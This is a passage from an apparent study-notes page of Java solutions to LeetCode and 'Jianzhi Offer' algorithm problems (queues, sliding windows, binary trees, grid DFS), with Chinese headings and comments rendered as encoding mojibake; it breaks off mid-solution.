<h3 id="å‰‘æŒ‡-Offer-59-II-é˜Ÿåˆ—çš„æœ€å¤§å€¼"><a href="#å‰‘æŒ‡-Offer-59-II-é˜Ÿåˆ—çš„æœ€å¤§å€¼" class="headerlink" title="å‰‘æŒ‡ Offer 59 - II. é˜Ÿåˆ—çš„æœ€å¤§å€¼"></a><a href="https://leetcode-cn.com/problems/dui-lie-de-zui-da-zhi-lcof/">å‰‘æŒ‡ Offer 59 - II. é˜Ÿåˆ—çš„æœ€å¤§å€¼</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// é˜Ÿåˆ—å¯ä»¥çœ‹æˆæ˜¯ä¸€ä¸ªæ»‘åŠ¨çª—å£ï¼Œå…¥é˜Ÿå°±æ˜¯å°†çª—å£çš„å³è¾¹ç•Œå³ç§»ï¼Œå‡ºé˜Ÿå°±æ˜¯å°†çª—å£çš„å·¦è¾¹ç•Œå³ç§»ã€‚</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MaxQueue</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Deque&lt;Integer&gt; queue;</span><br><span class="line">    <span class="keyword">private</span> Deque&lt;Integer&gt; help;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MaxQueue</span><span class="params">()</span> &#123;</span><br><span class="line">        queue = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        help = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">max_value</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> queue.isEmpty() ? -<span class="number">1</span> : help.peek();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push_back</span><span class="params">(<span class="type">int</span> value)</span> &#123;</span><br><span class="line">        queue.offer(value);</span><br><span class="line">        <span class="keyword">while</span> (!help.isEmpty() &amp;&amp; value &gt; help.peekLast()) &#123;</span><br><span class="line">            help.pollLast();</span><br><span class="line">        &#125;</span><br><span class="line">        help.offer(value);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">pop_front</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (queue.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">val</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">        <span class="keyword">if</span> (val == help.peek()) &#123;</span><br><span class="line">            help.poll();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å‰‘æŒ‡-Offer-10-I-æ–æ³¢é‚£å¥‘æ•°åˆ—"><a href="#å‰‘æŒ‡-Offer-10-I-æ–æ³¢é‚£å¥‘æ•°åˆ—" class="headerlink" title="å‰‘æŒ‡ Offer 10- I. æ–æ³¢é‚£å¥‘æ•°åˆ—"></a><a href="https://leetcode-cn.com/problems/fei-bo-na-qi-shu-lie-lcof/">å‰‘æŒ‡ Offer 10- I. æ–æ³¢é‚£å¥‘æ•°åˆ—</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">fib</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">p</span> <span class="operator">=</span> <span class="number">0</span>, q = <span class="number">1</span>, r;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            r = (p + q) % <span class="number">1000000007</span>;</span><br><span class="line">            p = q;</span><br><span class="line">            q = r;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="å‰‘æŒ‡-Offer-57-II-å’Œä¸ºsçš„è¿ç»­æ­£æ•°åºåˆ—"><a href="#å‰‘æŒ‡-Offer-57-II-å’Œä¸ºsçš„è¿ç»­æ­£æ•°åºåˆ—" class="headerlink" title="å‰‘æŒ‡ Offer 57 - II. å’Œä¸ºsçš„è¿ç»­æ­£æ•°åºåˆ—"></a><a href="https://leetcode-cn.com/problems/he-wei-sde-lian-xu-zheng-shu-xu-lie-lcof/">å‰‘æŒ‡ Offer 57 - II. å’Œä¸ºsçš„è¿ç»­æ­£æ•°åºåˆ—</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[][] findContinuousSequence(<span class="type">int</span> target) &#123;</span><br><span class="line">        ArrayList&lt;<span class="type">int</span>[]&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> <span class="number">1</span>; r &lt; target; r++) &#123;</span><br><span class="line">            sum += r;</span><br><span class="line">            <span class="keyword">while</span> (sum &gt; target) &#123;</span><br><span class="line">                sum -= l++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (sum == target) &#123;</span><br><span class="line">                <span class="type">int</span>[] tmp = <span class="keyword">new</span> <span class="title class_">int</span>[r - l + <span class="number">1</span>];</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tmp.length; i++) &#123;</span><br><span class="line">                    tmp[i] = l + i;</span><br><span class="line">                &#125;</span><br><span class="line">                list.add(tmp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[][] res = <span class="keyword">new</span> <span class="title class_">int</span>[list.size()][];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; list.size(); i++) &#123;</span><br><span class="line">            res[i] = list.get(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="209-é•¿åº¦æœ€å°çš„å­æ•°ç»„-x2F"><a href="#209-é•¿åº¦æœ€å°çš„å­æ•°ç»„-x2F" class="headerlink" title=" 209. é•¿åº¦æœ€å°çš„å­æ•°ç»„&#x2F;"></a><a href="https://leetcode-cn.com/problems/minimum-size-subarray-sum"> 209. é•¿åº¦æœ€å°çš„å­æ•°ç»„</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minSubArrayLen</span><span class="params">(<span class="type">int</span> target, <span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>, r = <span class="number">0</span>, min = nums.length + <span class="number">1</span>, sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (r &lt; nums.length) &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span> (r &lt; nums.length &amp;&amp; sum &lt; target ) &#123;</span><br><span class="line">                sum += nums[r];</span><br><span class="line">                r++;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span> (sum &gt;= target) &#123;</span><br><span class="line">                min = Math.min(min, r  - l);</span><br><span class="line">                sum -= nums[l];</span><br><span class="line">                l++;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (min == nums.length + <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> min;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="æ ‘"><a href="#æ ‘" class="headerlink" title="æ ‘"></a>æ ‘</h2><h3 id="671-äºŒå‰æ ‘ä¸­ç¬¬äºŒå°çš„èŠ‚ç‚¹"><a href="#671-äºŒå‰æ ‘ä¸­ç¬¬äºŒå°çš„èŠ‚ç‚¹" class="headerlink" title="671. äºŒå‰æ ‘ä¸­ç¬¬äºŒå°çš„èŠ‚ç‚¹"></a><a href="https://leetcode-cn.com/problems/second-minimum-node-in-a-binary-tree/">671. äºŒå‰æ ‘ä¸­ç¬¬äºŒå°çš„èŠ‚ç‚¹</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// é€’å½’</span></span><br><span class="line"><span class="comment">// é€’å½’æ‰¾åˆ°æ¯”æ ¹ç»“ç‚¹å¤§çš„å€¼æ—¶å¯ä»¥ç«‹å³è¿”å›.</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findSecondMinimumValue</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> find(root, root.val);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  	<span class="keyword">private</span> <span class="type">int</span> <span class="title function_">find</span><span class="params">(TreeNode root, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (root.val &gt; val) &#123;</span><br><span class="line">        <span class="keyword">return</span> root.val;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> find(root.left, val);</span><br><span class="line">      <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> find(root.right, val);</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span>(l &gt; val &amp;&amp; r &gt; val) &#123;</span><br><span class="line">        <span class="keyword">return</span> Math.min(l, r);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">return</span> Math.max(l, r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="236-äºŒå‰æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ"><a href="#236-äºŒå‰æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ" class="headerlink" title="236. äºŒå‰æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ"></a><a href="https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-tree/">236. äºŒå‰æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ååºéå†dfs</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root == p || root == q) &#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span> lowestCommonAncestor(root.left, p, q);</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">right</span> <span class="operator">=</span> lowestCommonAncestor(root.right, p, q);</span><br><span class="line">        <span class="keyword">if</span> (left == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> right;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (right == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="235-äºŒå‰æœç´¢æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ"><a href="#235-äºŒå‰æœç´¢æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ" class="headerlink" title="235. äºŒå‰æœç´¢æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ"></a><a href="https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-search-tree/">235. äºŒå‰æœç´¢æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// é€’å½’</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">res</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">        lca(root, p, q);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lca</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ((root.val - p.val) * (root.val - q.val) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            res = root;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (root.val &lt; p.val &amp;&amp; root.val &lt; q.val) &#123;</span><br><span class="line">            lca(root.right, p, q);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            lca(root.left, p, q);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="230-äºŒå‰æœç´¢æ ‘ä¸­ç¬¬Kå°çš„å…ƒç´ "><a href="#230-äºŒå‰æœç´¢æ ‘ä¸­ç¬¬Kå°çš„å…ƒç´ " class="headerlink" title="230. äºŒå‰æœç´¢æ ‘ä¸­ç¬¬Kå°çš„å…ƒç´ "></a><a href="https://leetcode-cn.com/problems/kth-smallest-element-in-a-bst/">230. äºŒå‰æœç´¢æ ‘ä¸­ç¬¬Kå°çš„å…ƒç´ </a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">kthSmallest</span><span class="params">(TreeNode root, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">			ArrayList&lt;Integer&gt; nums = inorder(root, <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;());</span><br><span class="line">      <span class="keyword">return</span> nums.get(k-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  	</span><br><span class="line">  	<span class="keyword">public</span> ArrayList&lt;Integer&gt; <span class="title function_">inorder</span><span class="params">(TreeNode root, ArrayList&lt;Integer&gt; arr)</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (root == <span class="literal">null</span>) <span class="keyword">return</span> arr;</span><br><span class="line">      inorder(root.left, arr);</span><br><span class="line">      arr.add(root.val);</span><br><span class="line">      inorder(root.right, arr);</span><br><span class="line">      <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¿­ä»£</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">kthSmallest</span><span class="params">(TreeNode root, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">    Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>();</span><br><span class="line">      <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">          <span class="keyword">while</span> (root != <span class="literal">null</span>) &#123;</span><br><span class="line">              stack.push(root);</span><br><span class="line">              root = root.left;</span><br><span class="line">          &#125;</span><br><span class="line">          </span><br><span class="line">          root = stack.pop();</span><br><span class="line">          k = k - <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">if</span> (k == <span class="number">0</span>) <span class="keyword">return</span> root.val;</span><br><span class="line">          root = root.right;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="124-äºŒå‰æ ‘ä¸­çš„æœ€å¤§è·¯å¾„å’Œ"><a href="#124-äºŒå‰æ ‘ä¸­çš„æœ€å¤§è·¯å¾„å’Œ" class="headerlink" title="124. äºŒå‰æ ‘ä¸­çš„æœ€å¤§è·¯å¾„å’Œ"></a><a href="https://leetcode-cn.com/problems/binary-tree-maximum-path-sum/">124. äºŒå‰æ ‘ä¸­çš„æœ€å¤§è·¯å¾„å’Œ</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è®¾ç½®ä¸€ä¸ªå…¨å±€å˜é‡resè®°å½•æœ€å¤§è·¯å¾„å’Œ</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> Integer.MIN_VALUE;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxPathSum</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">       myMaxPathSum(root);</span><br><span class="line">       <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">myMaxPathSum</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> myMaxPathSum(root.left);</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> myMaxPathSum(root.right);</span><br><span class="line">        <span class="keyword">if</span> (left &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            left = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            right = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        max = Math.max(max, left + root.val + right);</span><br><span class="line">        <span class="keyword">return</span> Math.max(root.val + left, root.val + right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="98-éªŒè¯äºŒå‰æœç´¢æ ‘"><a href="#98-éªŒè¯äºŒå‰æœç´¢æ ‘" class="headerlink" title="98. éªŒè¯äºŒå‰æœç´¢æ ‘"></a><a href="https://leetcode-cn.com/problems/validate-binary-search-tree/">98. éªŒè¯äºŒå‰æœç´¢æ ‘</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ä¸­åºä¸ºå‡åºéå†</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">long</span> <span class="variable">pre</span> <span class="operator">=</span> Long.MIN_VALUE;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValidBST</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!isValidBST(root.left)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (root.val &lt;= pre) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        pre = root.val;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> isValidBST(root.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="130-è¢«å›´ç»•çš„åŒºåŸŸ"><a href="#130-è¢«å›´ç»•çš„åŒºåŸŸ" class="headerlink" title="130. è¢«å›´ç»•çš„åŒºåŸŸ"></a><a href="https://leetcode-cn.com/problems/surrounded-regions/">130. è¢«å›´ç»•çš„åŒºåŸŸ</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è¿™æ—¶å€™çš„ O æ˜¯ä¸åšæ›¿æ¢çš„ã€‚å› ä¸ºå’Œè¾¹ç•Œæ˜¯è¿é€šçš„ã€‚ä¸ºäº†è®°å½•è¿™ç§çŠ¶æ€ï¼Œæˆ‘ä»¬æŠŠè¿™ç§æƒ…å†µä¸‹çš„ O æ¢æˆ # ä½œä¸ºå ä½ç¬¦ï¼Œå¾…æœç´¢ç»“æŸä¹‹åï¼Œé‡åˆ°O æ›¿æ¢ä¸º Xï¼ˆå’Œè¾¹ç•Œä¸è¿é€šçš„Oï¼‰ï¼›é‡åˆ° #ï¼Œæ›¿æ¢å› O(å’Œè¾¹ç•Œè¿é€šçš„O)ã€‚</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">solve</span><span class="params">(<span class="type">char</span>[][] board)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (board == <span class="literal">null</span> || board.length == <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> board.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> board[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isEdge</span> <span class="operator">=</span> i == <span class="number">0</span> || j == <span class="number">0</span> || i == m - <span class="number">1</span> || j == n - <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (isEdge &amp;&amp; board[i][j] == <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">                    dfs(board, i, j);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">                    board[i][j] = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">                    board[i][j] = <span class="string">&#x27;O&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">char</span>[][] board, <span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || j &lt; <span class="number">0</span> || i &gt;= board.length || j &gt;= board[<span class="number">0</span>].length || board[i][j] == <span class="string">&#x27;X&#x27;</span> || board[i][j] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        board[i][j] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">        dfs(board, i - <span class="number">1</span>, j);</span><br><span class="line">        dfs(board, i + <span class="number">1</span>, j);</span><br><span class="line">        dfs(board, i, j - <span class="number">1</span>);</span><br><span class="line">        dfs(board, i, j + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// éé€’å½’çš„æ–¹å¼ï¼Œæˆ‘ä»¬éœ€è¦è®°å½•æ¯ä¸€æ¬¡éå†è¿‡çš„ä½ç½®ï¼Œæˆ‘ä»¬ç”¨ stack æ¥è®°å½•ï¼Œå› ä¸ºå®ƒå…ˆè¿›åå‡ºçš„ç‰¹ç‚¹ã€‚</span></span><br><span class="line"><span class="comment">// è€Œä½ç½®æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªå†…éƒ¨ç±» Pos æ¥æ ‡è®°æ¨ªåæ ‡å’Œçºµåæ ‡ã€‚</span></span><br><span class="line"><span class="comment">// æ³¨æ„çš„æ˜¯ï¼Œåœ¨å†™éé€’å½’çš„æ—¶å€™ï¼Œæˆ‘ä»¬æ¯æ¬¡æŸ¥çœ‹ stack é¡¶ï¼Œä½†æ˜¯å¹¶ä¸å‡º stackï¼Œç›´åˆ°è¿™ä¸ªä½ç½®ä¸Šä¸‹å·¦å³éƒ½æœç´¢ä¸åˆ°çš„æ—¶å€™å‡º Stackã€‚</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Pos</span> &#123;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="type">int</span> j;</span><br><span class="line">        Pos(<span class="type">int</span> i, <span class="type">int</span> j) &#123;</span><br><span class="line">            <span class="built_in">this</span>.i = i;</span><br><span class="line">            <span class="built_in">this</span>.j = j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">solve</span><span class="params">(<span class="type">char</span>[][] board)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (board == <span class="literal">null</span> || board.length == <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> board.length;</span><br><span class="line">       <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> board[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isEdge</span> <span class="operator">=</span> i == <span class="number">0</span> || j == <span class="number">0</span> || i == m - <span class="number">1</span> || j == n - <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (isEdge &amp;&amp; board[i][j] == <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">                    dfs(board, i, j);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">                    board[i][j] = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">                    board[i][j] = <span class="string">&#x27;O&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    